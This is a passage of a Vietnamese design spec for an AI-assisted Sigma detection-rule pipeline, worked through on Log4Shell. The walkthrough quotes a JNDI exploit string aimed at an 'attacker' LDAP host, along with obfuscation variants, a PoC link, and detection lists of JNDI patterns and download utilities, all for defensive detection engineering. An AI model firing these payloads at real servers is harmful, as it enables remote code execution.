### 8.10. Fallback (khi AI fail / API key missing / timeout)

```python
def conservative_estimate(rule: SigmaRule) -> NoiseEstimate:
    return NoiseEstimate(
        events_per_day="medium",
        estimated_count="100-1k",
        complexity_class="medium",
        noise_factors=["conservative_default"],
        likely_false_positives=[],
        recommended_filters=[],
        level_adjustment="consider_downgrade",
        reasoning="AI unavailable, using conservative estimate",
        confidence=0.3,
        ai_used=False,
    )
```

Khi fallback chạy, set `NoiseEstimate.ai_used = False` (propagation lên `EnrichedCVEContext`).

### 8.11. Service Interface — `app/services/ai/noise_estimator.py`

```python
class AINoiseEstimator:
    def __init__(
        self,
        anthropic_client: Anthropic,
        greynoise_client: GreyNoiseClient | None = None,  # optional, Mode B
        conservative_fallback: Callable[[SigmaRule], NoiseEstimate] = conservative_estimate,
    ):
        self.client = anthropic_client
        self.greynoise = greynoise_client
        self.fallback = conservative_fallback

    async def estimate(self, rule: SigmaRule) -> NoiseEstimate:
        try:
            iocs = extract_iocs(rule)
            greynoise_context = None
            if self.greynoise and iocs:
                greynoise_context = await self.greynoise.lookup_many(iocs)
            return await self._ai_estimate(rule, greynoise_context)
        except (AIServiceError, ValidationError, json.JSONDecodeError):
            logger.warning("AI noise estimate failed, using conservative fallback")
            return self.fallback(rule)
```

### 8.12. Output Bước 7 (tóm tắt)

- `NoiseEstimate` instance với `events_per_day`, `complexity_class`, `level_adjustment` đã chốt.
- `level` trong `SigmaRule.metadata.level` đã hiệu chỉnh (nếu `level_adjustment` ≠ null).
- Filter bổ sung đã viết (nếu `recommended_filters` ≠ []).
- Quyết định **PROCEED** (phát hành) / **REWRITE** (quay lại Bước 6) / **NO-RELEASE** (quay lại Bước 4 đổi trục).

---

## 9. ~~Bước 8 — Validate & Convert~~ (BỎ)

> [!IMPORTANT] Tại sao bỏ Bước 8 khỏi quy trình lõi?
> 1. **Phụ thuộc môi trường**: `sigma check` / `sigma validate` / `sigma convert` cần `sigma-cli` cài local + `pySigma` + đầy đủ backend plugin → khó ép vào spec portable.
> 2. **Không tăng giá trị detection**: validate chỉ bắt lỗi convention/format, không liên quan tới chất lượng detection.
> 3. **Nên tự động hoá qua CI**: pre-commit hook chạy `yamllint` + `sigma check` + `sigma validate` mỗi commit; pipeline CI chạy `sigma convert` smoke-test (xem [§12](#12-tooling-reference)).
> 4. **Đã có sẵn trong code**: `app/sigma_validation/validator.py` + `quality_scorer.py` đã làm phần lớn việc này rồi.

> [!TIP] Checklist thay thế (chạy trong CI, ngoài scope spec)
> - L1: `yamllint rules/` + `sigma check rules/`
> - L2: `sigma validate rules/`
> - L3: `sigma convert -t splunk` + `-t elasticsearch` cho mỗi rule mới

> [!NOTE] Sau khi rule đã pass validate bằng CI, bước tiếp là *chia sẻ & bảo trì*: phát hành kèm **license [DRL 1.1](https://github.com/SigmaHQ/Detection-Rule-License)**; quản lý vòng đời qua `status` + `related` (xem [§7.2](#72-từng-field--quy-tắc-chính-xác)); feedback từ SOC (FP rate, alert count thực tế) → quay lại Bước 7 cập nhật noise estimate + tinh chỉnh filter; drift detection: telemetry schema đổi → re-validate.

---

## 10. Ví Dụ End-to-End: Log4Shell (CVE-2021-44228)

> CVE kinh điển: phát hiện được trên cả 3 trục → minh hoạ trọn vẹn quy trình. Mỗi bước trình bày như thật, với callout `[AI]` chỉ ra trường nào AI sinh ra.

### Bước 1 — Triage (rule-based, không AI)
- **CVSS**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` = **10.0**. Đọc vector: khai thác **từ xa** (`AV:N`), **đơn giản** (`AC:L`), **không cần quyền** (`PR:N`), **không cần tương tác** (`UI:N`), **vượt scope** (`S:C`) → tối nguy hiểm.
- **CPE**: `log4j-core` **2.0-beta9 → 2.14.1**.
- **CWE**: CWE-917 (Expression Language Injection) / CWE-502 (Deserialization).
- **KEV**: ✅ thêm 2021-12-10. **EPSS**: rất cao (~0.94+). **PoC**: tràn ngập.
- **Capability**: `in_scope` — có software path quan sát được trên process_creation + webserver + network_connection.
- **Quyết định**: **GO**, ưu tiên tối đa.

**Output (`TriageContext` instance):**
```python
TriageContext(
    in_kev=True,
    kev_added_date=datetime(2021, 12, 10),
    ransomware_usage=True,
    epss_score=0.975, epss_percentile=0.99,
    internet_exposure=None,        # chưa tích hợp Shodan
    public_poc=True,
    poc_references=["https://github.com/kozmer/log4j-shell-poc", ...],
    threat_actors=None,            # chưa tích hợp
    observed_in_the_wild=True,
    capability_assessment="in_scope",
    priority="critical",
    priority_score=100,
    decision="GO",
    rationale="CVSS 10.0 + KEV + EPSS 0.97 + 100k+ exposed instances",
)
```

### Bước 2 — Phân tích + ATT&CK (AI)

> [!AI] AI sinh ra: `vulnerability_class`, `vulnerability_type`, `mandatory_behaviors`, `tactics`, `techniques`, `subtechniques`, `attack_flow`, `likely_outcome`, `confidence`, `reasoning`. Fallback là `analyze_behavior()` + `map_attack()`.

- **Cơ chế**: chuỗi `${jndi:ldap://attacker/a}` được Log4j thực hiện *lookup* → server tự kết nối ra **LDAP/RMI** của attacker → tải về & nạp **class Java độc hại** → **RCE**.
- **Mổ PoC**: *(a) trigger* = chuỗi JNDI nhét vào field bị log (vd header `User-Agent`, URI); *(b) precondition* = log4j ≤ 2.14.1, JVM cho remote class loading; *(c) side-effect* = **egress LDAP/RMI** + **process con** từ tiến trình Java.
- **Khó né**: server *kết nối ra ngoài* + *spawn process con*. **Dễ né**: chuỗi `jndi` literal (obfuscation `${${::-j}ndi:...}`, `${lower:j}ndi`).
- **ATT&CK**: `T1190` (Initial Access) → `T1059` (Execution) → `T1105`/`T1071` (tải tool/C2).

**Output (`TechnicalAnalysis` + `AttackMapping`):**
```python
TechnicalAnalysis(
    family="log4shell",
    signature="log4j_jndi_lookup",
    vulnerability_type="JNDI Injection",
    vulnerability_class=VulnerabilityClass.DESERIALIZATION,
    exploit_vector="http_request",
    pre_auth=True, remote_exploitable=True, exploit_complexity="low",
    confidence=0.97,
    cwe_metadata=CWEMetadata(cwe_id="CWE-917", cwe_name="Expression Language Injection", mapping_confidence=0.95),
    attack_flow=AttackFlow(
        entry_vector="http_header_or_uri",
        execution_mechanism="unsafe_object_materialization",
        observable_side_effects=["network_callback", "process_creation"],
    ),
    likely_outcome="remote_code_execution",
    mandatory_behaviors=["network_callback", "process_creation", "file_write"],
    evasive_indicators=["string_obfuscation", "nested_lookups"],
    exploit_requirements=["reachable_service", "vulnerable_log4j_version"],
    analysis_confidence=0.96,
    classification_reason=["CWE-917 EL injection", "family:log4shell", "signature:log4j_jndi_lookup"],
    behavior_reason=["mandatory_behaviors:network_callback,process_creation,file_write"],
    reasoning=[
        "log4j lookup mechanism is mandatory - cannot be disabled without patching",
        "egress to attacker-controlled LDAP/RMI is the hard-to-evade side effect",
        "string '${jndi:' can be obfuscated, but lookup behavior cannot",
    ],
)

AttackMapping(
    tactics=["TA0001", "TA0002", "TA0011"],
    techniques=["T1190", "T1059", "T1071"],
    subtechniques=["T1059.004"],
    confidence=0.94,
    mapping_reasons=[
        "vulnerability_class:DESERIALIZATION",
        "behavior:network_callback",
        "behavior:process_creation",
    ],
    attack_mapping_confidence=0.94,
)
```

### Bước 3 — Coverage/Gap Analysis (rule-based, không AI)

```bash
# Trục 1: theo CVE id
rg -l "cve\.2021\.44228" rules/ rules-emerging-threats/
# → Có ~12 rule SigmaHQ đã cover Log4Shell ở các trục khác nhau

# Trục 2: theo TTP + logsource
yq '. | select(.tags[] | contains("attack.t1059")) | select(.logsource.category == "process_creation")' \
   rules/windows/process_creation/*.yml | grep -B2 -i "java"
# → Có rule "proc_creation_win_susp_java_child.yml" (id: 4e2f...) — generic java spawn child
```

**Output (`CoverageAssessment`):**
```python
CoverageAssessment(
    decision="NEW",
    matched_rule_ids=["4e2f1c8a-9b3d-4e5f-8a7b-6c5d4e3f2a1b"],  # generic java child
    matched_rule_titles=["Suspicious Java Child Process"],
    coverage_score=0.62,  # partial overlap
    related_rules=["similar:4e2f1c8a-9b3d-4e5f-8a7b-6c5d4e3f2a1b"],
    relationship_type="similar",
    reasoning="Existing rule covers java-spawn-child generically; our new rule is Log4Shell-specific with curated child list",
    decision_reason="NEW with related.similar pointing to existing generic rule",
)
```

**Quyết định**:
- **Rule A** (pre-exploit, JNDI string trong web request): **NEW** — chưa có rule SigmaHQ specific cho JNDI lookup pattern trong webserver category.
- **Rule B** (post-exploit, java spawn child): **NEW với `related.type: similar`** trỏ về `proc_creation_win_susp_java_child.yml`.
- **Rule C** (network_connection, egress LDAP từ java): **NEW** — chưa có rule sẵn cho pattern này.

### Bước 4 — Telemetry (AI, 3 trục)

> [!AI] AI sinh ra: `detection_axis[]`, `sigma_logsources`, `required_fields`, `sysmon_eids`, `telemetry_requirements`, `telemetry_gaps`, `gap_severity`. Fallback là `select_detection_axis()`.

| Trục | Dấu vết | `logsource` | Field taxonomy |
|---|---|---|---|
| Pre-exploit | Chuỗi `${jndi:` trong request | `webserver` | `cs-uri-query`, `cs-user-agent`, `cs-referer` |
| Post-exploit | `java` spawn `cmd`/`powershell`/shell | `process_creation` | `ParentImage`, `Image` |
| Impact | Egress LDAP/RMI từ web server | `network_connection` | `Image`, `DestinationPort` (389/1389/1099), `Initiated` |

**Output (`TelemetryAssessment`):**
```python
TelemetryAssessment(
    detection_axis=["pre-exploit", "post-exploit", "impact"],
    candidate_logsources=["webserver", "process_creation", "network_connection"],
    sigma_logsources=[
        SigmaLogsource(category="webserver", product="linux"),  # Tomcat/spring
        SigmaLogsource(category="process_creation", product="windows"),
        SigmaLogsource(category="network_connection", product="windows"),
    ],
    telemetry_requirements=TelemetryRequirements(required_event_ids=["1", "3"]),
    pre_exploit_detection=["web_cve_2021_44228_log4shell_jndi"],
    post_exploit_detection=["proc_creation_win_susp_java_child_log4shell"],
    impact_detection=["net_connection_win_java_egress_ldap"],
    telemetry_feasibility_score=0.88,
    detection_strategy=["prioritize post-exploit (java child)", "add impact (LDAP egress) if EID 3 enabled"],
    required_events=["1", "3"],
    required_fields=["ParentImage", "Image", "DestinationPort"],
    telemetry_confidence=0.90,
    correlation_required=False,
    field_taxonomy_notes=["webserver uses cs-* not Image", "process_creation uses Image/ParentImage not cs-uri-query"],
    validated_fields=["ParentImage", "Image", "DestinationPort"],
    invalid_fields=[],
    taxonomy_warnings=[],
)
```

### Bước 5 — ~~Lab~~ (BỎ)
> Trong spec này, dùng [EVTX-ATTACK-SAMPLES](https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES) `evtx-samples/2021-12-10-Log4j-RCE-via-JNDI-string/` có sẵn. Nếu muốn tự dựng, dùng [vulhub/log4j/CVE-2021-44228](https://github.com/vulhub/vulhub/tree/master/log4j/CVE-2021-44228).

### Bước 6 — Viết rule (AI)

> [!AI] AI sinh ra: toàn bộ file YAML. Fallback là `DetectionTemplateBuilder` + family templates (`web_log4shell`, `proc_creation_java_child_log4shell`).

**Rule A** — `web_cve_2021_44228_log4shell_jndi.yml` (pre-exploit):

```yaml
title: Potential Log4Shell JNDI Exploitation In Web Request
id: c4d5e6f7-8a9b-4c1d-9e2f-3a4b5c6d7e8f
name: web_log4shell_jndi
status: experimental
description: |
    Detects the JNDI lookup string pattern characteristic of Log4Shell (CVE-2021-44228)
    exploitation attempts within web request fields such as the URI query, User-Agent or Referer.

    Estimated noise: <placeholder> | Complexity: <placeholder>
references:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
    - https://logging.apache.org/log4j/2.x/security.html
author: CVE-TI Platform
date: 2026-06-05
tags:
    - attack.initial_access
    - attack.t1190
    - cve.2021.44228
logsource:
    category: webserver
detection:
    keywords:
        - '${jndi:ldap:'
        - '${jndi:ldaps:'
        - '${jndi:rmi:'
        - '${jndi:dns:'
        - '${jndi:iiop:'
        - '${jndi:nis:'
        - '${jndi:corba:'
    obfuscated:
        '|re': '(?i)\$\{[^}]{0,40}j[^}]{0,40}n[^}]{0,40}d[^}]{0,40}i'
    condition: keywords or obfuscated
falsepositives:
    - Vulnerability scanners (e.g. Nessus, Qualys) sending benign JNDI probe strings
    - Internal security research traffic
level: critical
```

**Rule B** — `proc_creation_win_susp_java_child_log4shell.yml` (post-exploit):

```yaml
title: Suspicious Child Process Of Java Indicative Of Log4Shell Exploitation
id: d7e8f9a0-1b2c-4d3e-8f4a-5b6c7d8e9f0a
related:
    - id: 4e2f1c8a-9b3d-4e5f-8a7b-6c5d4e3f2a1b
      type: similar
status: experimental
description: |
    Detects a Java process spawning a suspicious child process such as a command shell or
    download utility, which can indicate code execution following Log4Shell (CVE-2021-44228) exploitation.

    Estimated noise: <placeholder> | Complexity: <placeholder>
references:
    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
author: CVE-TI Platform
date: 2026-06-05
tags:
    - attack.execution
    - attack.t1059
    - cve.2021.44228
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith:
            - '\java.exe'
            - '\javaw.exe'
    selection_child:
        Image|endswith:
            - '\cmd.exe'
            - '\powershell.exe'
            - '\whoami.exe'
            - '\curl.exe'
            - '\certutil.exe'
            - '\bitsadmin.exe'
    condition: selection_parent and selection_child
falsepositives:
    - Legitimate Java applications launching child processes (build tooling, admin scripts)
level: high
```

> Biến thể Linux: đổi `product: linux`, `ParentImage|endswith: '/java'`, `Image|endswith: ['/sh','/bash','/curl','/wget']`.

### Bước 7 — Noise + complexity (AI)

> [!AI] AI sinh ra: `events_per_day`, `complexity_class`, `level_adjustment`, `recommended_filters`. Fallback là `conservative_estimate()`.

| Rule | Estimate noise | Complexity | Hành động |
|---|---|---|---|
| Rule A (JNDI keywords + regex) | `low` (chuỗi `${jndi:` hiếm trong baseline; vulnerability scanner burst là FP chính) | `medium` (regex `(?i)\$\{[^}]{0,40}j[^}]{0,40}...` có quantifier giới hạn `{0,40}` → OK trên Splunk, chậm hơn trên Sentinel — chấp nhận được) | Giữ `level: critical` |
| Rule B (java parent + suspicious child) | `low-medium` (chỉ build server Java + admin script là FP; số lượng nhỏ trên 10k endpoint) | `low` (chỉ `endswith` trên 2 field) | Giữ `level: high` |
| Rule C (network egress) | `medium` (cần phân biệt LDAP nội bộ hợp lệ) | `low` | Có thể giữ `high`, thêm `filter` cho LDAP nội bộ trước phát hành |
| Correlation (≥5 events/10m từ 1 IP) | `very_low` (chỉ scanner / actual attack) | `low` (chỉ count) | Giữ `level: high` |

**Output (`NoiseEstimate` cho Rule A):**
```python
NoiseEstimate(
    events_per_day="low",
    estimated_count="<100",
    complexity_class="medium",
    noise_factors=["rare string '${jndi:' in baseline", "scanner burst is main FP"],
    likely_false_positives=["Nessus/Qualys JNDI probe strings", "internal red team"],
    recommended_filters=["User-Agent|contains: 'Nessus'", "User-Agent|contains: 'Qualys'"],
    level_adjustment=None,  # giữ critical
    reasoning="Strict keyword + bounded regex, baseline traffic doesn't contain JNDI strings. FP rate driven by vulnerability scanners which can be filtered.",
    confidence=0.85,
    ai_used=True,
)
```

Sau khi có NoiseEstimate, orchestrator update `description`:
```yaml
description: |
    Detects the JNDI lookup string pattern characteristic of Log4Shell (CVE-2021-44228)
    exploitation attempts within web request fields such as the URI query, User-Agent or Referer.

    Estimated noise: low (<100 alerts/day on a 10k-endpoint reference environment).
    Complexity: medium (single keyword list + bounded regex).
```

**Quyết định**: PROCEED với Rule A, B. Rule C cần thêm filter cho LDAP server nội bộ trước phát hành (back to Bước 6 ngắn).

### Bước 8 — ~~Validate & convert~~ (BỎ, CI xử lý)
> Pre-commit hook + GitHub Actions chạy `yamllint` + `sigma check` + `sigma validate` mỗi lần thay đổi rule. CI pipeline chạy `sigma convert -t splunk` + `-t elasticsearch` để smoke-test. Xem [§12](#12-tooling-reference).

---

## 11. Template + Checklist

### 11.1. Bản ghi triage (Bước 1)
```text
CVE: | Sản phẩm/ver: | CVSS (vector): | CWE: | KEV/EPSS: | Exposure: | Threat actor: | PoC(permalink): | Capability: | GO/NO-GO: | Lý do:
```

### 11.2. Coverage analysis record (Bước 3)
```text
CVE:           CVE-XXXX-YYYYY
Existing rule tìm thấy:
  - <id>  <path>  <similarity reason>
  - ...
Quyết định:    NEW / EXTEND <rule-id> / SUPERSEDE <rule-id>
related block (nếu NEW):
  - id: ...
    type: similar / obsolete / derived / merged
```

### 11.3. Compliant Sigma rule skeleton

```yaml
title:                    # Title Case
id:                       # uuidgen — duy nhất
related:                  # từ Bước 3 nếu có
    # - id: ...
    #   type: similar | obsolete | derived | merged | renamed
status: experimental
description: |
    Detects ...
    Estimated noise: <placeholder> | Complexity: <placeholder>    # sẽ điền ở Bước 7
references:
    - https://             # public + permalink, KHÔNG link ATT&CK
author:                   # tên/tổ chức
date: 2026-06-05          # ISO YYYY-MM-DD
# modified:               # bump khi sửa filter/FP, GIỮ id
tags:
    - attack.              # tactic
    - attack.t             # technique
    - cve.                 # vd cve.2021.44228
logsource:
    category:              # field theo taxonomy của logsource này
    product:
detection:
    selection:
    condition: selection
falsepositives:
    - Unknown              # KHÔNG dùng None/Pentest/Red Team
level:                     # informational|low|medium|high|critical (hiệu chỉnh ở Bước 7)
```

### 11.4. Checklist phân tích → telemetry (Bước 2–4)
- [ ] Đã đọc CVSS vector + xác định bề mặt tấn công.
- [ ] **[AI]** Bước 2: `TechnicalAnalysis` + `AttackMapping` đã có `analysis_confidence` ≥ 0.7.
- [ ] **[AI]** Bước 2: technique IDs đều nằm trong MITRE ATT&CK taxonomy (validate hậu kiểm).
- [ ] Đã map CWE → loại dấu vết.
- [ ] Đã mổ PoC: trigger / precondition / side-effect.
- [ ] **Đã query portfolio (CVE id + TTP+logsource) → quyết định NEW / EXTEND / SUPERSEDE.** ★
- [ ] **Nếu SUPERSEDE/similar: đã chuẩn bị `related` block.** ★
- [ ] **[AI]** Bước 4: `TelemetryAssessment` đã có ≥1 `sigma_logsources` với `required_fields` hợp lệ (taxonomy validator pass).
- [ ] **[AI]** Bước 4: `telemetry_gaps` đã list rõ (vd EID 7 thường tắt).
- [ ] Đã chọn trục phát hiện (ưu tiên post/impact) + `logsource` chuẩn.
- [ ] Đã xác nhận telemetry tồn tại (EID/Sysmon config cần thiết).

### 11.5. Checklist authoring (Bước 6–7)
- [ ] **[AI]** Bước 6: rule YAML pass L1 schema (`sigma check`).
- [ ] **[AI]** Bước 6: `title` Title Case; `description` bắt đầu "Detects".
- [ ] **[AI]** Bước 6: `id` UUID v4 duy nhất; `date` ISO `YYYY-MM-DD`.
- [ ] **[AI]** Bước 6: `references` public + permalink; ATT&CK ở `tags` không ở references.
- [ ] **[AI]** Bước 6: `falsepositives` không dùng None/Pentest/Red Team.
- [ ] Field đúng **taxonomy của logsource** (không vendor-specific, không generalize Sysmon).
- [ ] **[AI]** Bước 6: tên file đúng prefix convention (proc_creation_win_, web_, …).
- [ ] **[AI]** Bước 7: đã estimate `events_per_day` + `complexity_class`.
- [ ] **[AI]** Bước 7: `level_adjustment` đã được áp dụng (downgrade nếu noise high).
- [ ] **[AI]** Bước 7: noise + complexity đã chèn vào `description`.
- [ ] CI: L1 `sigma check` + `yamllint` pass; L2 `sigma validate` pass.
- [ ] CI: convert sạch ≥2 backend hợp lý; fire trên positive dataset, không fire trên negative.
- [ ] Đổi semantic → `id` mới + `related`; chỉ tinh chỉnh → giữ `id` + `modified`.

---

## 12. Tooling Reference

```bash
# Sigma tooling (chạy trong CI, ngoài scope quy trình lõi)
pip install sigma-cli yamllint
sigma plugin list            # backend & validator khả dụng
sigma list targets           # các backend convert
sigma check    <path>        # L1 schema
sigma validate <path>        # L2 validators (convention)
sigma convert -t <target> <rule>

# AI integration
pip install anthropic         # Anthropic Python SDK
export ANTHROPIC_API_KEY=sk-ant-...   # required

# Optional (Mode B noise estimator)
export GREYNOISE_API_KEY=...   # tuỳ chọn
```

| Hạng mục | Link |
|---|---|
| Sigma specification | `https://github.com/SigmaHQ/sigma-specification` |
| Rule convention (SigmaHQ) | `https://github.com/SigmaHQ/sigma-specification/blob/main/sigmahq/sigmahq-rule-convention.md` |
| Filename convention | `https://github.com/SigmaHQ/sigma-specification/blob/main/sigmahq/sigmahq-filename-convention.md` |
| Field taxonomy appendix | `https://github.com/SigmaHQ/sigma-specification/blob/main/specification/sigma-appendix-taxonomy.md` |
| Correlation rules spec | `https://github.com/SigmaHQ/sigma-specification/blob/main/specification/sigma-correlation-rules-specification.md` |
| pySigma validators (SigmaHQ) | `https://github.com/SigmaHQ/pySigma-validators-sigmaHQ` |
| Detection Rule License 1.1 | `https://github.com/SigmaHQ/Detection-Rule-License` |
| Repo mẫu (3000+ rule) | `https://github.com/SigmaHQ/sigma` |
| Convert online | `https://uncoder.io/` |
| ATT&CK Navigator | `https://mitre-attack.github.io/attack-navigator/` |
| Sysmon config mẫu | `https://github.com/SwiftOnSecurity/sysmon-config` |
| Public dataset (Windows) | `https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES` |
| Public dataset (Splunk) | `https://github.com/splunk/botsv3` |
| Atomic Red Team | `https://github.com/redcanaryco/atomic-red-team` |
| Vulhub (CVE container) | `https://github.com/vulhub/vulhub` |
| CISA KEV | `https://cisa.gov/known-exploited-vulnerabilities-catalog` |
| VulnCheck KEV | `https://vulncheck.com/kev` |
| EPSS API | `https://api.first.org/data/v1/epss` |
| GreyNoise (noise check, Mode B) | `https://greynoise.io` |
| Anthropic SDK | `https://docs.anthropic.com/en/api/getting-started` |

---

## 13. Cạm Bẫy & Lưu Ý

> [!WARNING] Những lỗi làm rule sai hoặc mất giá trị
> - **Detect CVE thay vì hành vi**: cố "bắt CVE" thay vì *hành vi khai thác* → rule vô nghĩa.
> - **SIEM lock-in**: dùng field ECS/SPL/KQL thay vì Sigma taxonomy → không convert được nơi khác.
> - **Generalize sai taxonomy**: bê field `process_creation` (`Image`) sang `webserver` (phải là `cs-uri-query`).
> - **Chỉ dựa signature payload**: dễ bị né bằng obfuscation/encoding. Luôn bổ sung trục post/impact.
> - **Bỏ qua telemetry gap**: viết rule cho field không được log → rule chết câm.
> - **Over-fit**: khoá 1 IP/chuỗi literal → attacker đổi là mất tác dụng.
> - **Bỏ qua coverage analysis ★**: tạo rule trùng / không khai báo `related` khi superseding → vỡ tracking, duplicate alert.
> - **Bỏ qua noise estimate ★**: rule fire 10k alert/ngày → SOC tắt rule, công viết rule lãng phí.
> - **Regex unbounded ★**: `[^}]*` / `.*` không giới hạn → SIEM hiệu năng kém chặn rule.
> - **`falsepositives` dùng từ cấm** (None/Pentest/Red Team); **`references` không permalink** hoặc để link ATT&CK; **`title` không Title Case**; **`date` sai format**; **trùng UUID** → `sigma validate` fail.
> - **Thiếu test case** (positive/negative) → rule bất khả kiểm.
> - **Viết EQL/SPL trực tiếp** cho logic tương quan thay vì Sigma Correlation → phá portability.
> - **Nhầm đổi `id` vs giữ `id`** khi cập nhật → vỡ tracking của người dùng.

> [!WARNING] Lỗi đặc thù khi dùng AI (Bước 2/4/6/7)
> - **AI hallucination TTP**: AI có thể emit technique ID không tồn tại trong ATT&CK (vd `T9999`). **Luôn validate** bằng MITRE STIX bundle hoặc hard-code whitelist trước khi merge.
> - **AI hallucination logsource**: AI có thể chọn `category` không chuẩn (vd `process_creation` cho HTTP log). **Luôn chạy `taxonomy_validator`** sau AI để filter invalid fields.
> - **AI parse YAML lỗi**: AI có thể sinh YAML malformed (indent sai, quote không đóng). **Luôn parse → validate → fallback** nếu raise `yaml.YAMLError`.
> - **AI timeout / rate limit**: Anthropic API có rate limit theo tier. **Luôn wrap trong `AIServiceError`** + retry 1-2 lần + fallback.
> - **AI cost**: mỗi CVE tốn ~4 API calls (Bước 2, 4, 6, 7) × ~5K tokens output. Track chi phí ở monitoring.
> - **AI không có CVSS / CWE context đầy đủ**: nếu NVD provider chưa enrich đủ, AI suy luận sai. **Đảm bảo Bước 1 đã chạy đầy đủ** trước khi gọi Bước 2.
> - **AI tạo rule IOC-only khi behaviour tốt hơn**: AI có thể khoá 1 IP/domain trong selection thay vì viết theo hành vi. **Review kết quả** trước khi merge.
> - **AI dùng `falsepositives: "None"`**: hallucinate từ pattern cũ. **Validate enum** + reject nếu match từ cấm.
> - **AI upgrade level sai**: AI có thể set `critical` cho rule `high` noise. **Luôn chạy Bước 7** sau Bước 6 để auto-downgrade.

> [!NOTE] Sau khi rule sẵn sàng (ngoài phạm vi quy trình này)
> Khi rule đã pass validate bằng CI, bước tiếp là *chia sẻ & bảo trì*: phát hành kèm **license [DRL 1.1](https://github.com/SigmaHQ/Detection-Rule-License)** (yêu cầu attribution cả khi reproduce rule lẫn khi alert match); quản lý vòng đời qua `status` + `related` (xem [§7.2](#72-từng-field--quy-tắc-chính-xác)); CI tự động hoá L1–L3 mỗi thay đổi. Closed-loop: feedback từ SOC (FP rate, alert count thực tế) → quay lại Bước 7 cập nhật noise estimate + tinh chỉnh filter; drift detection: telemetry schema đổi → re-validate.




